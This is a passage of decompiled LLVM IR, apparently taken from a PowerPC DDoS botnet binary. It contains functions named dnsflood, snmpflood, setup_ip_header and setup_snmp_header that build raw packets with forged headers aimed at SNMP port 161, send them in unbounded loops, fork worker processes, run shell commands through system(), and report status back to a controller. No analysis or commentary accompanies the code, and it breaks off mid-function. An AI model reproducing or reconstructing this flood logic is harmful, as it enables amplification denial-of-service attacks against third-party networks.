  %v3_10002fa8 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp46 = icmp sgt i32 %v3_10002fa8, -1
  br i1 %tmp46, label %dec_label_pc_10002fc8, label %dec_label_pc_10002fc0

dec_label_pc_10002fc0:                            ; preds = %dec_label_pc_10002f9c
  %v0_10002fc4 = call i32 @__GI_exit()
  br label %dec_label_pc_10002fc8

dec_label_pc_10002fc8:                            ; preds = %dec_label_pc_10002f9c, %dec_label_pc_10002fc0
  %v2_10002fcc = icmp sgt i32 %arg3, 4
  br i1 %v2_10002fcc, label %dec_label_pc_10002ffc, label %dec_label_pc_10002fd4

dec_label_pc_10002fd4:                            ; preds = %dec_label_pc_10002fc8
  %v3_10002fd8 = load i32, i32* @global_var_1004519c.24, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10002ff0 = call i32 @Send(i32 %v3_10002fd8, i32 ptrtoint ([67 x i8]* @global_var_1002a5f8.107 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10002ff8 = call i32 @__GI_exit()
  br label %dec_label_pc_10002ffc

dec_label_pc_10002ffc:                            ; preds = %dec_label_pc_10002fc8, %dec_label_pc_10002fd4
  %v1_10003000 = add i32 %arg4, 12
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v1_10003004 = inttoptr i32 %v1_10003000 to i32*
  %v2_10003004 = load i32, i32* %v1_10003004, align 4
  store i32 %v2_10003004, i32* @r3, align 4
  %v0_1000300c = call i32 @__GI_strlen()
  %v1_10003014 = mul i32 %v0_1000300c, 5
  store i32 %v1_10003014, i32* %r9.global-to-local, align 4
  %v1_10003018 = add i32 %v1_10003014, 160
  %v2_10003024 = icmp sgt i32 %v1_10003018, 1023
  br i1 %v2_10003024, label %dec_label_pc_100033bc, label %dec_label_pc_1000302c

dec_label_pc_1000302c:                            ; preds = %dec_label_pc_10002ffc
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_10003038 = load i32, i32* %v1_10003004, align 4
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_10003044 = load i32, i32* %v1_10003004, align 4
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_10003050 = load i32, i32* %v1_10003004, align 4
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_1000305c = load i32, i32* %v1_10003004, align 4
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_1000306c = ptrtoint i32* %stack_var_-1376 to i32
  store i32 %v2_1000306c, i32* @r3, align 4
  store i32 %v1_10003018, i32* @r4, align 4
  store i32 ptrtoint ([171 x i8]* @global_var_1002a63c.108 to i32), i32* @r5, align 4
  store i32 %v2_1000305c, i32* %r9.global-to-local, align 4
  store i32 268447896, i32* @lr, align 4
  %v9_10003094 = call i32 @__GI_snprintf(i32 %v2_1000306c, i32 %v1_10003018, i32 ptrtoint ([171 x i8]* @global_var_1002a63c.108 to i32), i32 %v2_10003038, i32 %v2_10003044, i32 %v2_10003050, i32 %v2_1000305c, i32 %v1_10003018)
  store i32 268447908, i32* @lr, align 4
  %v1_100030a0 = call i32 @system(i32 %v2_1000306c)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451b4.106, align 4
  store i32 256, i32* @r3, align 4
  store i32 268447928, i32* @lr, align 4
  %v0_100030b4 = call i32 @malloc()
  store i32 256, i32* %r9.global-to-local, align 4
  store i32 %v0_100030b4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 256, i32* @r5, align 4
  store i32 268447960, i32* @lr, align 4
  %v0_100030d4 = call i32 @__GI_memset()
  %v2_10003148 = ptrtoint i32* %stack_var_-319 to i32
  store i32 255, i32* %r9.global-to-local, align 4
  store i32 %v2_10003148, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 255, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10003160.109 to i32), i32* @lr, align 4
  %v0_1000315c = call i32 @__GI_memset()
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268448124, i32* @lr, align 4
  %v3_10003178 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_1002a6e8.110 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6f0.111 to i32))
  br label %dec_label_pc_100031a0

dec_label_pc_10003188:                            ; preds = %dec_label_pc_100031a0
  %v2_10003190 = call i32 @ParseResolverLine(i32 %v0_100030d4, i32 %stack_var_-1396.0)
  store i32 %stack_var_-1396.0, i32* %r9.global-to-local, align 4
  %v1_10003198 = add i32 %stack_var_-1396.0, 1
  br label %dec_label_pc_100031a0

dec_label_pc_100031a0:                            ; preds = %dec_label_pc_1000302c, %dec_label_pc_10003188
  %stack_var_-1396.0 = phi i32 [ 0, %dec_label_pc_1000302c ], [ %v1_10003198, %dec_label_pc_10003188 ]
  store i32 268448176, i32* @lr, align 4
  %v3_100031ac = call i32 @fgets(i32 %v0_100030d4, i32 256, i32 %v3_10003178)
  %v3_100031b4 = icmp eq i32 %v3_100031ac, 0
  br i1 %v3_100031b4, label %dec_label_pc_100031bc, label %dec_label_pc_10003188

dec_label_pc_100031bc:                            ; preds = %dec_label_pc_100031a0
  %v1_100031c8 = add i32 %arg4, 16
  store i32 %v1_100031c8, i32* %r9.global-to-local, align 4
  %v1_100031cc = inttoptr i32 %v1_100031c8 to i32*
  %v2_100031cc = load i32, i32* %v1_100031cc, align 4
  store i32 268448216, i32* @lr, align 4
  %v1_100031d4 = call i32 @atol(i32 %v2_100031cc)
  %v3_100031e4 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_100031e4, i32* %r9.global-to-local, align 4
  %v1_100031e8 = add i32 %v3_100031e4, 532
  %v2_100031e8 = inttoptr i32 %v1_100031e8 to i32*
  %v3_100031e8 = load i32, i32* %v2_100031e8, align 4
  store i32 0, i32* @r3, align 4
  %v1_100031fc = call i32 @htons(i32 0)
  %v1_1000320c = add i32 %arg4, 4
  store i32 %v1_1000320c, i32* %r9.global-to-local, align 4
  %v1_10003210 = inttoptr i32 %v1_1000320c to i32*
  %v2_10003210 = load i32, i32* %v1_10003210, align 4
  store i32 268448284, i32* @lr, align 4
  %v1_10003218 = call i32 @inet_addr(i32 %v2_10003210)
  %v1_10003228 = mul i32 %v1_100031d4, 28
  %v1_10003230 = add i32 %v1_10003228, 30
  %v1_10003234 = and i32 %v1_10003230, -16
  %v2_1000323c = load i32, i32* %stack_var_-1424, align 4
  %v1_10003244 = load i32, i32* @r1, align 4
  %v3_10003244 = sub i32 %v1_10003244, %v1_10003234
  %v4_10003244 = inttoptr i32 %v3_10003244 to i32*
  store i32 %v2_1000323c, i32* %v4_10003244, align 4
  %v1_10003254 = add i32 %v3_10003244, 23
  %v1_10003258 = and i32 %v1_10003254, -16
  %v1_10003270 = add i32 %arg4, 8
  store i32 %v1_10003270, i32* %r9.global-to-local, align 4
  %v1_10003274 = inttoptr i32 %v1_10003270 to i32*
  %v2_10003274 = load i32, i32* %v1_10003274, align 4
  store i32 268448384, i32* @lr, align 4
  %v1_1000327c = call i32 @atol(i32 %v2_10003274)
  store i32 %v1_100031d4, i32* %r9.global-to-local, align 4
  %v2_100033402 = icmp sgt i32 %v1_100031d4, 0
  br i1 %v2_100033402, label %dec_label_pc_10003294, label %dec_label_pc_10003348

dec_label_pc_10003294:                            ; preds = %dec_label_pc_100031bc, %dec_label_pc_10003294
  %storemerge15 = phi i32 [ %v1_10003330, %dec_label_pc_10003294 ], [ 0, %dec_label_pc_100031bc ]
  %v1_1000329c = mul i32 %storemerge15, 28
  %v2_100032a0 = add i32 %v1_1000329c, %v1_10003258
  %v2_100032a8 = inttoptr i32 %v2_100032a0 to i32*
  store i32 %storemerge15, i32* %v2_100032a8, align 4
  store i32 %v2_100032a0, i32* %r9.global-to-local, align 4
  store i32 %v1_10003218, i32* @r11, align 4
  store i32 %tmp, i32* @r8, align 4
  %v2_100032cc = add i32 %v2_100032a0, 8
  %v3_100032cc = inttoptr i32 %v2_100032cc to i32*
  store i32 2, i32* %v3_100032cc, align 4
  %v0_100032d0 = load i32, i32* @r11, align 4
  %v1_100032d0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100032d0 = add i32 %v1_100032d0, 12
  %v3_100032d0 = inttoptr i32 %v2_100032d0 to i32*
  store i32 %v0_100032d0, i32* %v3_100032d0, align 4
  %v0_100032d4 = load i32, i32* @r10, align 4
  %v1_100032d4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100032d4 = add i32 %v1_100032d4, 16
  %v3_100032d4 = inttoptr i32 %v2_100032d4 to i32*
  store i32 %v0_100032d4, i32* %v3_100032d4, align 4
  %v1_100032d8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100032d8 = add i32 %v1_100032d8, 20
  %v3_100032d8 = inttoptr i32 %v2_100032d8 to i32*
  store i32 %tmp, i32* %v3_100032d8, align 4
  %v1_100032ec = add i32 %v2_100032a0, 4
  %v2_100032f4 = inttoptr i32 %v1_100032ec to i32*
  store i32 %v3_100031e8, i32* %v2_100032f4, align 4
  %v1_10003308 = add i32 %v2_100032a0, 24
  %v2_10003310 = inttoptr i32 %v1_10003308 to i32*
  store i32 %v1_1000327c, i32* %v2_10003310, align 4
  store i32 %v1_10003258, i32* %r9.global-to-local, align 4
  store i32 268448556, i32* @lr, align 4
  %v3_10003328 = call i32 @dnsflood(i32 %v2_100032a0, i32 %tmp, i32 %v1_10003258)
  %v1_10003330 = add nuw nsw i32 %storemerge15, 1
  store i32 %v1_100031d4, i32* %r9.global-to-local, align 4
  %v2_10003340 = icmp slt i32 %v1_10003330, %v1_100031d4
  br i1 %v2_10003340, label %dec_label_pc_10003294, label %dec_label_pc_10003348

dec_label_pc_10003348:                            ; preds = %dec_label_pc_10003294, %dec_label_pc_100031bc
  %v3_1000334c = load i32, i32* @global_var_1004519c.24, align 4
  store i32 %v1_1000320c, i32* %r9.global-to-local, align 4
  %v2_10003358 = load i32, i32* %v1_10003210, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v7_10003384 = call i32 @Send(i32 %v3_1000334c, i32 ptrtoint ([36 x i8]* @global_var_1002a6f4.112 to i32), i32 %arg2, i32 %v2_10003358)
  %tmp47 = icmp slt i32 %arg3, 5
  br i1 %tmp47, label %dec_label_pc_100033b4, label %dec_label_pc_10003394

dec_label_pc_10003394:                            ; preds = %dec_label_pc_10003348
  %v1_10003398 = add i32 %arg4, 20
  store i32 %v1_10003398, i32* %r9.global-to-local, align 4
  %v1_1000339c = inttoptr i32 %v1_10003398 to i32*
  %v2_1000339c = load i32, i32* %v1_1000339c, align 4
  store i32 268448680, i32* @lr, align 4
  %v1_100033a4 = call i32 @atol(i32 %v2_1000339c)
  store i32 ptrtoint ([3 x i8]* @global_var_100033b4.113 to i32), i32* @lr, align 4
  %v1_100033b0 = call i32 @sleep(i32 %v1_100033a4)
  br label %dec_label_pc_100033b4

dec_label_pc_100033b4:                            ; preds = %dec_label_pc_10003348, %dec_label_pc_10003394
  %v0_100033b8 = call i32 @__GI_exit()
  br label %dec_label_pc_100033bc

dec_label_pc_100033bc:                            ; preds = %entry, %dec_label_pc_10002ffc, %dec_label_pc_100033b4
  %v0_100033e8 = phi i32 [ %v1_10002f8c, %entry ], [ %v0_1000300c, %dec_label_pc_10002ffc ], [ %v0_100033b8, %dec_label_pc_100033b4 ]
  store i32 %v5_10002f54, i32* %r9.global-to-local, align 4
  ret i32 %v0_100033e8

; uselistorder directives
  uselistorder i32 %v1_10003330, { 1, 0 }
  uselistorder i32 %v2_100032a0, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %storemerge15, { 2, 1, 0 }
  uselistorder i32 %v1_10003258, { 2, 1, 0 }
  uselistorder i32 %v1_100031d4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_100030d4, { 1, 0 }
  uselistorder i32 %v2_1000306c, { 1, 0, 2 }
  uselistorder i32 %v2_1000305c, { 1, 0 }
  uselistorder i32 %v1_10003018, { 2, 1, 0, 3 }
  uselistorder i32* %v1_10003004, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_10003000, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-1424, { 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100033bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100033b4, { 1, 0 }
  uselistorder label %dec_label_pc_10003294, { 1, 0 }
  uselistorder label %dec_label_pc_100031a0, { 1, 0 }
  uselistorder label %dec_label_pc_10002ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10002fc8, { 1, 0 }
}

define i32 @setup_snmp_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 4500, i32* @r3, align 4
  %v1_10003408 = call i32 @htons(i32 4500)
  %sext = mul i32 %v1_10003408, 65536
  %v1_1000340c = sdiv i32 %sext, 65536
  %v1_10003414 = trunc i32 %v1_1000340c to i16
  store i16 %v1_10003414, i16* %arg1, align 2
  store i32 161, i32* @r3, align 4
  %v1_1000341c = call i32 @htons(i32 161)
  %v1_10003428 = trunc i32 %v1_1000341c to i16
  %v3_10003428 = add i32 %tmp, 2
  %v4_10003428 = inttoptr i32 %v3_10003428 to i16*
  store i16 %v1_10003428, i16* %v4_10003428, align 2
  %v3_10003434 = add i32 %tmp, 6
  %v4_10003434 = inttoptr i32 %v3_10003434 to i16*
  store i16 0, i16* %v4_10003434, align 2
  %v1_1000343c = add i32 %tmp, 8
  store i32 %v1_1000343c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002a718.114 to i32), i32* @r4, align 4
  store i32 67, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003460.115 to i32), i32* @lr, align 4
  %v0_1000345c = call i32 @memcpy()
  store i32 75, i32* @r3, align 4
  %v1_10003464 = call i32 @htons(i32 75)
  %v2_10003464 = trunc i32 %v1_10003464 to i16
  %v3_10003470 = add i32 %tmp, 4
  %v4_10003470 = inttoptr i32 %v3_10003470 to i16*
  store i16 %v2_10003464, i16* %v4_10003470, align 2
  ret i32 %v1_10003464
}

define i32 @setup_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100034b0 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100034b0, i32* %arg1, align 4
  %v1_100034c4 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100034c4, i32* %arg1, align 4
  %v3_100034d4 = add i32 %tmp, 1
  %v4_100034d4 = inttoptr i32 %v3_100034d4 to i8*
  store i8 0, i8* %v4_100034d4, align 1
  %v3_100034e0 = add i32 %tmp, 2
  %v4_100034e0 = inttoptr i32 %v3_100034e0 to i16*
  store i16 42, i16* %v4_100034e0, align 2
  store i32 64074, i32* @r3, align 4
  %v1_100034ec = call i32 @htonl(i32 64074)
  %v1_100034fc = trunc i32 %v1_100034ec to i16
  %v3_100034fc = add i32 %tmp, 4
  %v4_100034fc = inttoptr i32 %v3_100034fc to i16*
  store i16 %v1_100034fc, i16* %v4_100034fc, align 2
  %v3_10003508 = add i32 %tmp, 6
  %v4_10003508 = inttoptr i32 %v3_10003508 to i16*
  store i16 0, i16* %v4_10003508, align 2
  %v3_10003514 = add i32 %tmp, 8
  %v4_10003514 = inttoptr i32 %v3_10003514 to i8*
  store i8 -1, i8* %v4_10003514, align 1
  %v3_10003520 = add i32 %tmp, 9
  %v4_10003520 = inttoptr i32 %v3_10003520 to i8*
  store i8 17, i8* %v4_10003520, align 1
  %v3_1000352c = add i32 %tmp, 10
  %v4_1000352c = inttoptr i32 %v3_1000352c to i16*
  store i16 0, i16* %v4_1000352c, align 2
  store i32 268449084, i32* @lr, align 4
  %v2_10003538 = call i32 @inet_addr(i32 ptrtoint ([13 x i8]* @global_var_1002a75c.116 to i32))
  %v2_10003544 = add i32 %tmp, 12
  %v3_10003544 = inttoptr i32 %v2_10003544 to i32*
  store i32 %v2_10003538, i32* %v3_10003544, align 4
  ret i32 %v2_10003538
}

define i32 @snmpflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_10003580 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_1000358c = add i32 %v2_10003580, 20
  %v5_10003590 = inttoptr i32 %v1_1000358c to i16*
  %v1_1000359c = add i32 %arg1, 12
  %v2_1000359c = inttoptr i32 %v1_1000359c to i32*
  %v3_1000359c = load i32, i32* %v2_1000359c, align 4
  %v1_100035bc = add i32 %arg1, 4
  %v2_100035bc = inttoptr i32 %v1_100035bc to i32*
  %v3_100035bc = load i32, i32* %v2_100035bc, align 4
  store i32 268449236, i32* @lr, align 4
  %v3_100035d0 = call i32 @socket(i32 2, i32 3, i32 6)
  %tmp26 = icmp sgt i32 %v3_100035d0, -1
  br i1 %tmp26, label %dec_label_pc_100035f0, label %dec_label_pc_100035e8

dec_label_pc_100035e8:                            ; preds = %entry
  %v0_100035ec = call i32 @__GI_exit()
  br label %dec_label_pc_100035f0

dec_label_pc_100035f0:                            ; preds = %entry, %dec_label_pc_100035e8
  store i32 268449272, i32* @lr, align 4
  %v1_100035f4 = call i32 @__GI_time(i32 0)
  %v1_10003600 = call i32 @init_rand(i32 %v1_100035f4)
  store i32 %v2_10003580, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268449308, i32* @lr, align 4
  %v0_10003618 = call i32 @__GI_memset()
  store i32 268449316, i32* @lr, align 4
  %v2_10003620 = call i32 @setup_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268449324, i32* @lr, align 4
  %v2_10003628 = call i32 @setup_snmp_header(i16* %v5_10003590)
  store i32 268449328, i32* @lr, align 4
  %v0_1000362c = call i32 @random()
  %v2_1000364c = srem i32 %v0_1000362c, 65535
  %fold = add nsw i32 %v2_1000364c, 64510
  %v1_10003678 = urem i32 %fold, 65536
  store i32 %v1_10003678, i32* @r3, align 4
  %v1_10003680 = call i32 @htons(i32 %v1_10003678)
  %v1_1000368c = trunc i32 %v1_10003680 to i16
  store i16 %v1_1000368c, i16* %v5_10003590, align 4
  %v2_10003698 = add i32 %v2_10003580, 12
  %v3_10003698 = inttoptr i32 %v2_10003698 to i32*
  store i32 %v3_1000359c, i32* %v3_10003698, align 4
  %v1_100036a0 = add i32 %v3_100035bc, 4
  %v2_100036a0 = inttoptr i32 %v1_100036a0 to i32*
  %v3_100036a0 = load i32, i32* %v2_100036a0, align 4
  %v2_100036a8 = add i32 %v2_10003580, 16
  %v3_100036a8 = inttoptr i32 %v2_100036a8 to i32*
  store i32 %v3_100036a0, i32* %v3_100036a8, align 4
  %v1_100036b4 = or i32 %v2_10003580, 2
  %v2_100036b4 = inttoptr i32 %v1_100036b4 to i16*
  %v3_100036b4 = load i16, i16* %v2_100036b4, align 2
  %div = udiv i16 %v3_100036b4, 2
  %v1_100036bc = zext i16 %div to i32
  %v2_100036cc = bitcast i32* %stack_var_-4144 to i16*
  %v3_100036cc = call i32 @csum(i16* %v2_100036cc, i32 %v1_100036bc)
  %v1_100036d8 = trunc i32 %v3_100036cc to i16
  %v3_100036d8 = add i32 %v2_10003580, 10
  %v4_100036d8 = inttoptr i32 %v3_100036d8 to i16*
  store i16 %v1_100036d8, i16* %v4_100036d8, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_100036e4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268449540, i32* @lr, align 4
  %v5_10003700 = call i32 @__GI_setsockopt(i32 %v3_100035d0, i32 0, i32 3, i32 %v2_100036e4, i32 4)
  %tmp28 = icmp sgt i32 %v5_10003700, -1
  br i1 %tmp28, label %dec_label_pc_10003718, label %dec_label_pc_10003710

dec_label_pc_10003710:                            ; preds = %dec_label_pc_100035f0
  %v0_10003714 = call i32 @__GI_exit()
  br label %dec_label_pc_10003718

dec_label_pc_10003718:                            ; preds = %dec_label_pc_100035f0, %dec_label_pc_10003710
  store i32 268449568, i32* @lr, align 4
  %v1_1000371c = call i32 @__GI_time(i32 0)
  %v1_10003728 = call i32 @init_rand(i32 %v1_1000371c)
  %v3_100037a4 = add i32 %v2_10003580, 4
  %v4_100037a4 = inttoptr i32 %v3_100037a4 to i16*
  br label %dec_label_pc_10003734

dec_label_pc_10003734:                            ; preds = %dec_label_pc_10003818, %dec_label_pc_10003718
  %stack_var_-4160.0 = phi i32 [ %v3_100035bc, %dec_label_pc_10003718 ], [ %v3_10003770, %dec_label_pc_10003818 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10003718 ], [ %v1_1000381c, %dec_label_pc_10003818 ]
  %v3_10003738 = load i16, i16* %v2_100036b4, align 2
  %v4_10003738 = zext i16 %v3_10003738 to i32
  store i32 268449644, i32* @lr, align 4
  %v6_10003768 = call i32 @sendto(i32 %v3_100035d0, i32 %v2_10003580, i32 %v4_10003738, i32 0, i32 %stack_var_-4160.0, i32 16)
  %v1_10003770 = add i32 %stack_var_-4160.0, 532
  %v2_10003770 = inttoptr i32 %v1_10003770 to i32*
  %v3_10003770 = load i32, i32* %v2_10003770, align 4
  %v1_1000377c = add i32 %v3_10003770, 4
  %v2_1000377c = inttoptr i32 %v1_1000377c to i32*
  %v3_1000377c = load i32, i32* %v2_1000377c, align 4
  store i32 %v3_1000377c, i32* %v3_100036a8, align 4
  %v0_10003788 = call i32 @rand_cmwc()
  store i32 %v0_10003788, i32* @r3, align 4
  %v1_10003794 = call i32 @htonl(i32 %v0_10003788)
  %v1_100037a4 = trunc i32 %v1_10003794 to i16
  store i16 %v1_100037a4, i16* %v4_100037a4, align 4
  %v3_100037b0 = load i16, i16* %v2_100036b4, align 2
  %div29 = udiv i16 %v3_100037b0, 2
  %v1_100037b8 = zext i16 %div29 to i32
  %v3_100037c8 = call i32 @csum(i16* %v2_100036cc, i32 %v1_100037b8)
  %v1_100037d4 = trunc i32 %v3_100037c8 to i16
  store i16 %v1_100037d4, i16* %v4_100036d8, align 2
  %v3_100037dc = load i32, i32* @global_var_100451ac.120, align 4
  %v1_100037e0 = add i32 %v3_100037dc, 1
  store i32 %v1_100037e0, i32* @global_var_100451ac.120, align 4
  %v3_100037f0 = load i32, i32* @global_var_10045194.121, align 4
  %v3_100037f8 = icmp ugt i32 %v3_100037f0, %storemerge4
  br i1 %v3_100037f8, label %dec_label_pc_10003818, label %dec_label_pc_10003800

dec_label_pc_10003800:                            ; preds = %dec_label_pc_10003734
  %v3_1000380c = load i32, i32* @global_var_100450d4.122, align 4
  store i32 268449816, i32* @lr, align 4
  %v1_10003814 = call i32 @usleep(i32 %v3_1000380c)
  br label %dec_label_pc_10003818

dec_label_pc_10003818:                            ; preds = %dec_label_pc_10003734, %dec_label_pc_10003800
  %stack_var_-20.0 = phi i32 [ %storemerge4, %dec_label_pc_10003734 ], [ 0, %dec_label_pc_10003800 ]
  %v1_1000381c = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_10003734

; uselistorder directives
  uselistorder i32 %v3_10003770, { 1, 0 }
  uselistorder i32 %stack_var_-4160.0, { 1, 0 }
  uselistorder i32 %v1_10003678, { 1, 0 }
  uselistorder i32 %v2_10003580, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_10003818, { 1, 0 }
  uselistorder label %dec_label_pc_10003718, { 1, 0 }
  uselistorder label %dec_label_pc_100035f0, { 1, 0 }
}

define i32 @snmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1080 = alloca i32, align 4
  %stack_var_-1136 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10003828 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10003828, i32* %stack_var_-1136, align 4
  %v5_10003828 = ptrtoint i32* %stack_var_-1136 to i32
  %v1_10003860 = call i32 @mfork(i32 %arg2)
  %v3_10003868 = icmp eq i32 %v1_10003860, 0
  br i1 %v3_10003868, label %dec_label_pc_10003870, label %dec_label_pc_10003e58

dec_label_pc_10003870:                            ; preds = %entry
  store i32 268449920, i32* @lr, align 4
  %v3_1000387c = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp37 = icmp sgt i32 %v3_1000387c, -1
  br i1 %tmp37, label %dec_label_pc_1000389c, label %dec_label_pc_10003894

dec_label_pc_10003894:                            ; preds = %dec_label_pc_10003870
  %v0_10003898 = call i32 @__GI_exit()
  br label %dec_label_pc_1000389c

dec_label_pc_1000389c:                            ; preds = %dec_label_pc_10003870, %dec_label_pc_10003894
  %v2_100038a0 = icmp sgt i32 %arg3, 5
  br i1 %v2_100038a0, label %dec_label_pc_100038c8, label %dec_label_pc_100038a8

dec_label_pc_100038a8:                            ; preds = %dec_label_pc_1000389c
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_100038bc = call i32 @Send(i32 %arg1, i32 ptrtoint ([99 x i8]* @global_var_1002a76c.123 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_100038c4 = call i32 @__GI_exit()
  br label %dec_label_pc_100038c8

dec_label_pc_100038c8:                            ; preds = %dec_label_pc_1000389c, %dec_label_pc_100038a8
  %v1_100038cc = add i32 %arg4, 12
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v1_100038d0 = inttoptr i32 %v1_100038cc to i32*
  %v2_100038d0 = load i32, i32* %v1_100038d0, align 4
  store i32 %v2_100038d0, i32* @r3, align 4
  %v0_100038d8 = call i32 @__GI_strlen()
  %v1_100038e0 = mul i32 %v0_100038d8, 5
  store i32 %v1_100038e0, i32* %r9.global-to-local, align 4
  %v1_100038e4 = add i32 %v1_100038e0, 165
  %v2_100038f0 = icmp sgt i32 %v1_100038e4, 1023
  br i1 %v2_100038f0, label %dec_label_pc_10003e58, label %dec_label_pc_100038f8

dec_label_pc_100038f8:                            ; preds = %dec_label_pc_100038c8
  store i32 %v1_100038e4, i32* %r10.global-to-local, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_10003904 = load i32, i32* %v1_100038d0, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_10003910 = load i32, i32* %v1_100038d0, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_1000391c = load i32, i32* %v1_100038d0, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_10003928 = load i32, i32* %v1_100038d0, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_10003934 = load i32, i32* %v1_100038d0, align 4
  store i32 %v2_10003934, i32* %r11.global-to-local, align 4
  %v2_10003938 = ptrtoint i32* %stack_var_-1080 to i32
  store i32 %v2_10003938, i32* @r3, align 4
  store i32 %v1_100038e4, i32* @r4, align 4
  store i32 ptrtoint ([176 x i8]* @global_var_1002a7d0.124 to i32), i32* @r5, align 4
  store i32 %v2_10003928, i32* %r9.global-to-local, align 4
  store i32 %v2_10003934, i32* %r10.global-to-local, align 4
  store i32 268450148, i32* @lr, align 4
  %v9_10003960 = call i32 @__GI_snprintf(i32 %v2_10003938, i32 %v1_100038e4, i32 ptrtoint ([176 x i8]* @global_var_1002a7d0.124 to i32), i32 %v2_10003904, i32 %v2_10003910, i32 %v2_1000391c, i32 %v2_10003928, i32 %v1_100038e4)
  store i32 ptrtoint ([3 x i8]* @global_var_10003970.125 to i32), i32* @lr, align 4
  %v1_1000396c = call i32 @system(i32 %v2_10003938)
  store i32 268450168, i32* @lr, align 4
  %v1_10003974 = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10003984.126 to i32), i32* @lr, align 4
  %v1_10003980 = call i32 @srand(i32 %v1_10003974)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451b4.106, align 4
  store i32 128, i32* @r3, align 4
  store i32 268450220, i32* @lr, align 4
  %v0_100039a8 = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_100039a8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268450252, i32* @lr, align 4
  %v0_100039c8 = call i32 @__GI_memset()
  %v1_100039d8 = add i32 %arg4, 16
  store i32 %v1_100039d8, i32* %r9.global-to-local, align 4
  %v1_100039dc = inttoptr i32 %v1_100039d8 to i32*
  %v2_100039dc = load i32, i32* %v1_100039dc, align 4
  store i32 268450280, i32* @lr, align 4
  %v1_100039e4 = call i32 @atol(i32 %v2_100039dc)
  %v1_100039f4 = add i32 %arg4, 20
  store i32 %v1_100039f4, i32* %r9.global-to-local, align 4
  %v1_100039f8 = inttoptr i32 %v1_100039f4 to i32*
